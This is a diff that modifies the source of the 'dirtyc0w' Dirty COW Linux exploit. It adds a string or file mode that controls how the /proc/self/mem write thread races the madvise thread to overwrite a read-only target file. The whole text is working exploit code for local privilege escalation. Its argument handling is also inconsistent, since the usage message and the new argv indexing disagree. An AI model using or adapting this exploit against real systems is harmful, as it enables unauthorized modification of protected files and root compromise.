@@ -33,6 +33,7 @@ char *name;
 int size;
 int page_offset;
 
+
 void *madviseThread(void *arg)
 {
   char *str;
@@ -49,6 +50,7 @@ You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vu
   }
   printf("madvise %d\n\n",c);
 }
+
 
 void *procselfmemThread(void *arg)
 {
@@ -85,6 +87,7 @@ int main(int argc,char *argv[])
 /*
 You have to pass two arguments. File and Contents.
 */
+
   if (argc<5) {
   (void)fprintf(stderr, "%s\n",
       "usage: dirtyc0w target_file new_content size page_offset");
@@ -115,8 +118,14 @@ You have to open with PROT_READ.
 /*
 You have to do it on two threads.
 */
-  pthread_create(&pth1,NULL,madviseThread,argv[1]);
-  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
+  pthread_create(&pth1,NULL,madviseThread,argv[2]);
+  if (strcmp(argv[1], "string") == 0) {
+    printf("string\n");
+    pthread_create(&pth2,NULL,procselfmemThreadString,argv[3]);
+  } else {
+    printf("file\n");
+    pthread_create(&pth2,NULL,procselfmemThreadFile,argv[3]);
+  }
 /*
 You have to wait for the threads to finish.
 */
